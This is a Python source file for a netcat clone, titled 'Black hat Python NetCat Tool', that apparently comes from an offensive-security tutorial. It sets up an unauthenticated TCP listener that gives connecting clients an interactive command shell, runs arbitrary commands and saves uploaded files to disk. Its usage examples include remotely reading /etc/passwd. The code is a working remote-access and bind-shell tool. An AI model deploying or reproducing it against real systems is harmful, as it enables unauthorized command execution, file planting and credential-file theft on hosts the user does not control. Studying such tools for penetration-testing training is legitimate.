import argparse 
import socket 
import shlex
import subprocess
import sys 
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    return output.decode()


class NetCat: 
    def __init__(self,args,buffer=None):
        self.args=args
        self.buffer = buffer 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()


    def send(self):
        self.socket.connect((self.args.target,self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try: 
            while True: 
                recvLen = 1
                res = ''
                while recvLen:
                    data = self.socket.recv(4096)
                    recvLen =len(data)
                    res += data.decode()
                    if recvLen < 4096:
                        break
                if res:
                    print(res)
                    line = input ('> ')
                    line += '\n'
                    self.socket.send(line.encode())
        except KeyboardInterrupt:
            print('User terminated')
            self.socket.close()
            sys.exit()
    
    def listen(self):
        self.socket.bind((self.args.target,self.args.port))
        self.socket.listen(5)
        print(f'[*]Listener started on {self.args.target}:{self.args.port}')
        while True: 
            clientSocket, _ = self.socket.accept()
            clientThread = threading.Thread(
                target=self.handle, args =(clientSocket,)
            )
            clientThread.start()
    

    def handle (self,clientSocket):
        if self.args.execute:
            output = execute(self.args.execute)
            clientSocket.send(output.encode())
        
        elif self.args.upload:
            fileBuffer = b''
            while True: 
                data = clientSocket.recv(4096)
                if data: 
                    fileBuffer += data 
                else:
                    break
            
            with open(self.args.upload,'wb') as f:
                f.write(fileBuffer)
            message =f'[+] Saved file {self.args.upload}'
            clientSocket.send(message.encode())

        elif self.args.command:
            cmdBuffer = b''
            while True: 
                try: 
                    clientSocket.send(b'BHP-NetCat> ')
                    while '\n' not in cmdBuffer.decode():
                        cmdBuffer += clientSocket.recv(64)
                    res = execute(cmdBuffer.decode())
                    if res:
                        clientSocket.send(res.encode())
                    cmdBuffer = b''
                except Exception as e: 
                    print(f'[-] Server killed {e}')
                    self.socket.close()
                    sys.exit()


    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Black hat Python NetCat Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
                               netcat.py -t 192.168.1.108 -p 5555 -l -c #cmd shell
                               netcat.py -t 192.168.1.108 -p 5555 -l -u=file.txt #upload to file
                               netcat.py -t 192.168.1.108 -p 5555 -e=\"cat /etc/passwd\" #executes a cmd
                               echo 'TEST' | ./netcat.py -t 192.168.1.108 -p 5555 #echoes text to server 
                               netcat.py -t 192.168.1.108 -p 5555 #connect to server
                               '''))
    parser.add_argument('-c','--command',action='store_true',help="command shell")
    parser.add_argument('-e','--execute',help="execute specified command")
    parser.add_argument('-l','--listen',action='store_true',help="listen")
    parser.add_argument('-p','--port',type=int, default=8888, help="specified port")
    parser.add_argument('-t','--target',help="target")
    parser.add_argument('-u','--upload',help="upload file")

    args = parser.parse_args()

    if args.listen:
        buffer = ""
    else:
        buffer =sys.stdin.read()
    
    nc = NetCat(args,buffer.encode())
    nc.run()
